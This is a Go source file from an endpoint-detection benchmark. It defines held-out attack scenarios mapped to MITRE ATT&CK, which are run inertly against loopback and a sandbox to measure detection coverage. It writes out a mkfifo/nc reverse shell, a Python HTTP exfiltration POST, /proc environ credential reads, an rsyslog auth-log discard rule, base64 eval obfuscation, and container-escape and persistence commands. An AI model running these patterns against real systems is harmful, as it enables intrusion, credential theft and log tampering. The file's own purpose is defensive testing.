package bench

// This file adds a SECOND independent "held-out v2" scenario set. Like
// heldout.go it is a blind test: the scenarios were designed from real-world
// Linux attacker behaviour (mapped to MITRE ATT&CK), NOT from SBS's detection
// rules, so the measured rate is an honest number that is expected to fall well
// below 100%. The two held-out sets are disjoint: this file deliberately
// exercises tactics and techniques the first set left untouched -- discovery
// chains, shell-rc / at / udev persistence, GTFOBins living-off-the-land exec,
// /proc credential access, log-pipeline tampering, container-escape tooling,
// kernel-module staging, timestomping and env-based obfuscation.
//
// A scenario that no current rule catches is an expected, useful result: its
// Expect names the rule(s) a competent EDR *should* ideally fire, and the
// runner records the miss without any scenario being tuned to the rules. Many
// of the Expect IDs below are best guesses at the family a detection would live
// in; where SBS plainly has no such family the guess will simply never match,
// which is itself a true finding about coverage.
//
// Every scenario is harmless and self-contained, exactly like the other sets:
// network targets are 127.0.0.1 (a closed port, or an in-process listener the
// benchmark controls), files are written only inside the Sandbox, no real
// malware runs, "payloads" are inert strings or /bin/true, and the reverse
// shell is wired to a listener started here and fed two inert commands.
//
// Scenarios needing a tool that may be absent (at, awk, nc, python3, nsenter,
// depmod, ...) are guarded with errSkip and filtered out up front by
// HeldoutScenarios2, so a missing tool never counts as a missed detection.

import (
	"fmt"
	"os"
	"os/exec"
	"time"
)

// HeldoutScenarios2 returns the held-out v2 set, with tool-dependent scenarios
// whose binary is not on PATH filtered out so they are not scored as misses.
func HeldoutScenarios2() []Scenario {
	var out []Scenario
	for _, c := range heldout2Candidates() {
		if c.tool != "" {
			if _, err := exec.LookPath(c.tool); err != nil {
				continue
			}
		}
		out = append(out, c.sc)
	}
	return out
}

func heldout2Candidates() []heldoutCandidate {
	return []heldoutCandidate{
		// --- Discovery. Benign-looking recon chains; the point is to measure
		// false-positive discipline. A rule that fires here on ordinary admin
		// commands would be noisy, so a miss is the honest result. ---
		{sc: Scenario{
			Name: "system-discovery-chain", Technique: "T1082", Tactic: "discovery",
			Expect: []string{"SBS-PROC-011"},
			Run: func(*Sandbox) error {
				return sh(`whoami >/dev/null 2>&1; id >/dev/null 2>&1; ` +
					`uname -a >/dev/null 2>&1; cat /etc/os-release >/dev/null 2>&1; ` +
					`hostname >/dev/null 2>&1; sleep 0.3`)
			},
		}},
		{sc: Scenario{
			// find / -perm -4000 enumerates SUID binaries looking for a privesc
			// path; scoped to /usr/bin maxdepth 1 here so it stays fast and quiet.
			Name: "suid-binary-discovery", Technique: "T1083", Tactic: "discovery",
			Expect: []string{"SBS-PROC-011"},
			Run: func(*Sandbox) error {
				return sh(`find /usr/bin -maxdepth 1 -perm -4000 -type f 2>/dev/null >/dev/null; sleep 0.3`)
			},
		}},

		// --- Credential access via the proc filesystem (T1003.007). Reading
		// /proc/<pid>/environ harvests secrets passed through the environment.
		// Only our own processes' environ is readable without privilege. The
		// closest SBS family is the /etc/shadow rule, which keys on that exact
		// path, so this is very likely a miss. ---
		{sc: Scenario{
			Name: "proc-environ-cred-dump", Technique: "T1003.007", Tactic: "credential-access",
			Expect: []string{"SBS-PROC-007"},
			Run: func(*Sandbox) error {
				return sh(`cat /proc/self/environ >/dev/null 2>&1; ` +
					`for p in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$' | head -5); do ` +
					`cat /proc/$p/environ >/dev/null 2>&1; done; sleep 0.3`)
			},
		}},

		// --- Persistence in locations the benchmark does not watch. The config
		// watches cron/, drop/, ~/.ssh and the exact ld.so.preload path; shell
		// rc files, udev rules and the at spool fall outside it, so a name-based
		// rule can only fire for files the watcher reports. Expected misses that
		// document watch-path coverage. ---
		{sc: Scenario{
			Name: "shell-profile-persistence", Technique: "T1546.004", Tactic: "persistence",
			Expect: []string{"SBS-FILE-004"},
			Run: func(s *Sandbox) error {
				line := "\n# sbs-bench marker\nexport PATH=\"$HOME/.local/bin:$PATH\"\n"
				for _, name := range []string{".bashrc", ".profile"} {
					f, err := os.OpenFile(s.Dir("home", name), os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644)
					if err != nil {
						return err
					}
					_, werr := f.WriteString(line)
					f.Close()
					if werr != nil {
						return werr
					}
				}
				return nil
			},
		}},
		{sc: Scenario{
			// A udev rule triggers an executable on a device event -- event-based
			// persistence that lives under /etc/udev/rules.d (unwatched here).
			Name: "udev-rule-persistence", Technique: "T1546", Tactic: "persistence",
			Expect: []string{"SBS-FILE-004"},
			Run: func(s *Sandbox) error {
				dir := s.Dir("etc", "udev", "rules.d")
				if err := os.MkdirAll(dir, 0o755); err != nil {
					return err
				}
				rule := `ACTION=="add", SUBSYSTEM=="usb", RUN+="` + s.Dir("drop", ".trigger") + `"` + "\n"
				return os.WriteFile(s.Dir("etc", "udev", "rules.d", "99-sbs-bench.rules"), []byte(rule), 0o644)
			},
		}},
		{tool: "at", sc: Scenario{
			// The `at` queue is scheduled-task persistence like cron. An invalid
			// time spec makes at exit before scheduling anything, so it is inert;
			// its spool (/var/spool/cron/atjobs) is unwatched either way.
			Name: "at-job-persistence", Technique: "T1053.002", Tactic: "persistence",
			Expect: []string{"SBS-FILE-001"},
			Run: guard("at", func(*Sandbox) error {
				return sh(`echo /bin/true | at sbs-bench-invalid-time-spec 2>/dev/null; sleep 0.3`)
			}),
		}},
		{tool: "depmod", sc: Scenario{
			// Kernel-module persistence: stage an (inert) .ko under a fake
			// lib/modules tree and index it with depmod -b <sandbox>. A loadable
			// module is a classic rootkit foothold; depmod on an inert file is
			// harmless and scoped entirely to the sandbox basedir.
			Name: "kernel-module-staging", Technique: "T1547.006", Tactic: "persistence",
			Expect: []string{"SBS-FILE-004"},
			Run: guard("depmod", func(s *Sandbox) error {
				rel := "99.0.0-sbs-bench"
				dir := s.Dir("lib", "modules", rel, "kernel", "drivers")
				if err := os.MkdirAll(dir, 0o755); err != nil {
					return err
				}
				ko := s.Dir("lib", "modules", rel, "kernel", "drivers", "sbsrootkit.ko")
				if err := os.WriteFile(ko, []byte("inert benchmark module, not a real ELF\n"), 0o644); err != nil {
					return err
				}
				return sh("depmod -b " + s.Dir() + " " + rel + " 2>/dev/null; sleep 0.3")
			}),
		}},

		// --- Living-off-the-land execution (GTFOBins). Trusted utilities spawn
		// a shell/command; the shell is local (not networked), so socket-based
		// reverse-shell rules do not apply and a rule would need to key on the
		// unusual parent. All run an inert `id`. ---
		{sc: Scenario{
			Name: "gtfobins-find-exec", Technique: "T1059.004", Tactic: "execution",
			Expect: []string{"SBS-PROC-012"},
			Run: func(s *Sandbox) error {
				return sh(`find ` + s.Dir("drop") + ` -maxdepth 1 -exec /bin/sh -c 'id >/dev/null 2>&1' \; -quit 2>/dev/null; sleep 0.3`)
			},
		}},
		{tool: "awk", sc: Scenario{
			Name: "gtfobins-awk-system", Technique: "T1059.004", Tactic: "execution",
			Expect: []string{"SBS-PROC-012"},
			Run: guard("awk", func(*Sandbox) error {
				return sh(`awk 'BEGIN{system("id >/dev/null 2>&1")}'; sleep 0.3`)
			}),
		}},

		// --- Defense evasion: impair the logging pipeline, obfuscate commands,
		// timestomp artifacts, and load a library through the environment. ---
		{sc: Scenario{
			// Drop an rsyslog snippet that discards auth logs. Under /etc/rsyslog.d
			// (unwatched); the SBS log-tamper family keys on a log-deletion
			// *process*, not a config-file write, so this is likely a miss.
			Name: "rsyslog-config-tamper", Technique: "T1562.001", Tactic: "defense-evasion",
			Expect: []string{"SBS-PROC-013"},
			Run: func(s *Sandbox) error {
				dir := s.Dir("etc", "rsyslog.d")
				if err := os.MkdirAll(dir, 0o755); err != nil {
					return err
				}
				body := "# sbs-bench\nif $programname == 'sshd' then stop\nauth,authpriv.* ~\n"
				return os.WriteFile(s.Dir("etc", "rsyslog.d", "00-sbs-bench.conf"), []byte(body), 0o644)
			},
		}},
		{sc: Scenario{
			// Payload carried in an environment variable, base64-decoded and
			// eval'd at runtime. Distinct from the built-in `echo <b64> | base64 |
			// sh`: the indirection through an env var and eval tests whether the
			// base64-to-shell rule survives it. "aWQ=" decodes to "id".
			Name: "base64-env-obfuscated-exec", Technique: "T1140", Tactic: "defense-evasion",
			Expect: []string{"SBS-PROC-002"},
			Run: func(*Sandbox) error {
				return sh(`export SBS_P=aWQ=; eval "$(printf %s "$SBS_P" | base64 -d) >/dev/null 2>&1"; sleep 0.3`)
			},
		}},
		{sc: Scenario{
			// Timestomp: backdate a dropped artifact to blend with system files.
			// The drop/ dir is watched, but the write is inert (no signature) and
			// metadata manipulation via touch -t is the technique under test.
			Name: "timestomp-backdate", Technique: "T1070.006", Tactic: "defense-evasion",
			Expect: []string{"SBS-PROC-013"},
			Run: func(s *Sandbox) error {
				p := s.Dir("drop", "libcache.so")
				if err := os.WriteFile(p, []byte("inert\n"), 0o644); err != nil {
					return err
				}
				return runTimeout(exec.Command("touch", "-t", "200001010000", p), 5*time.Second)
			},
		}},
		{sc: Scenario{
			// Launch a process with LD_PRELOAD pointing at a (nonexistent) library.
			// The preload defense watches the ld.so.preload *file*; a per-process
			// env-var launch leaves that file untouched, so this likely slips past.
			Name: "ld-preload-env-launch", Technique: "T1574.006", Tactic: "defense-evasion",
			Expect: []string{"SBS-FILE-003"},
			Run: func(s *Sandbox) error {
				cmd := exec.Command("/bin/true")
				cmd.Env = append(os.Environ(), "LD_PRELOAD="+s.Dir("drop", "libpreload-bench.so"))
				return runTimeout(cmd, 5*time.Second)
			},
		}},

		// --- Persistence that writes the watched ld.so.preload path through a
		// different mechanism (a shell append rather than a Go WriteFile). This
		// one SHOULD be caught; it is included so the set is not all-misses and
		// to confirm the preload watch fires regardless of writer. ---
		{sc: Scenario{
			Name: "ldpreload-shell-append", Technique: "T1574.006", Tactic: "persistence",
			Expect: []string{"SBS-FILE-003"},
			Run: func(s *Sandbox) error {
				return sh(`printf '%s\n' /usr/lib/libheldout2-bench.so >> ` + s.Dir("etc", "ld.so.preload"))
			},
		}},

		// --- Command and control / exfiltration. ---
		{tool: "nc", sc: Scenario{
			// Classic mkfifo+nc reverse shell: nc holds the socket, a separate
			// /bin/sh reads/writes a FIFO. Because the shell's stdio is the FIFO
			// (not the socket), a rule correlating a shell directly to a network
			// connection is likely to miss it. Wired to the benchmark's own
			// listener and fed inert commands.
			Name: "mkfifo-nc-reverse-shell", Technique: "T1059.004", Tactic: "command-and-control",
			Expect: []string{"SBS-PROC-003", "SBS-PROC-004"},
			Run: guard("nc", func(s *Sandbox) error {
				return revShellConnect(func(port int) *exec.Cmd {
					script := fmt.Sprintf(`f=%q; rm -f "$f"; mkfifo "$f" 2>/dev/null; `+
						`/bin/sh -i <"$f" 2>&1 | nc 127.0.0.1 %d >"$f"; rm -f "$f"`,
						s.Dir("drop", ".ncfifo"), port)
					return exec.Command("/bin/sh", "-c", script)
				})
			}),
		}},
		{tool: "python3", sc: Scenario{
			// HTTP exfil POST to a closed loopback port. The connection is refused
			// (nothing leaves the host); the technique under test is C2/exfil over
			// an application-layer protocol from an interpreter.
			Name: "python-http-exfil", Technique: "T1041", Tactic: "exfiltration",
			Expect: []string{"SBS-PROC-014"},
			Run: guard("python3", func(*Sandbox) error {
				src := "import urllib.request\n" +
					"try:\n" +
					"    urllib.request.urlopen('http://127.0.0.1:9/upload', data=b'sbs-bench-exfil', timeout=1)\n" +
					"except Exception:\n" +
					"    pass\n"
				return runTimeout(exec.Command("python3", "-c", src), 5*time.Second)
			}),
		}},

		// --- Privilege escalation / container escape tooling. Both fail
		// harmlessly without privilege (EPERM) but the invocation itself is the
		// signal a competent EDR would key on. ---
		{tool: "nsenter", sc: Scenario{
			Name: "nsenter-container-escape", Technique: "T1611", Tactic: "privilege-escalation",
			Expect: []string{"SBS-PROC-015"},
			Run: guard("nsenter", func(*Sandbox) error {
				return sh(`nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/true 2>/dev/null; sleep 0.3`)
			}),
		}},
		{tool: "unshare", sc: Scenario{
			Name: "unshare-user-namespace", Technique: "T1611", Tactic: "privilege-escalation",
			Expect: []string{"SBS-PROC-015"},
			Run: guard("unshare", func(*Sandbox) error {
				return sh(`unshare --user --map-root-user /bin/true 2>/dev/null; sleep 0.3`)
			}),
		}},
	}
}
